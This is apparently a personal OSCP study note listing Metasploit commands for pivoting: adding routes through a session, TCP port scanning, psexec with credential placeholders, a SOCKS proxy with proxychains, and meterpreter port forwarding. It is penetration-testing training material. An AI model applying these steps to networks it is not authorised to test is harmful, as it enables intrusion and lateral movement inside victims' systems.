---
aliases:
  - Metasploit Pivoting
tags:
  - tech
  - cybsec
  - offensive_security
  - offsec
  - oscp
  - metasploit
  - pivoting
  - pivot
  - tunneling
  - port_redirection
author: Mehdi N Tehrani
creat_date: 2024-01-05
category: Cyber Security
subcategory: Offensive Security - OSCP
---

# Manually add route to a session
#manual #route #session #add_route_to_session
```msfconsole
route add <subnet> <session_id>
route print
route del <subnet> <session_id>
route flush    # remove all
```

## Port Scanning in Metasploit
#port_scan 
```msfconsole
use auxiliary/scanner/portscan/tcp
set rhosts <ip>
set ports <ports>
run
```

## SMB enumeration in Metasploit
#smb #psexec 
```msfconsole
use exploit/windows/smb/psexec
set smbuser <username>
set smbpass <password>
set rhosts <ip1,ip2>
set lport
set payload <payload>
run
```

# Automatically add route
#autoroute #automatic #route 
```msfconsole
use multi/manage/autoroute
set session <session_id>
run
```

# Proxy
#proxy #socks #socks_proxy
```msfconsole
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
set srvport 1080
set version 5
run -j
```

update `proxychains.conf` file accordingly
#proxychains 
```sh
$ tail /etc/proxychains.conf -n 1

socks5 127.0.0.1 1080
```

# Port Forwarding
#port_forwarding 
```meterpreter
portfwd list
portfwd add -l <localport> -p <target_port> -r <target_ip>
portfwd delete 
```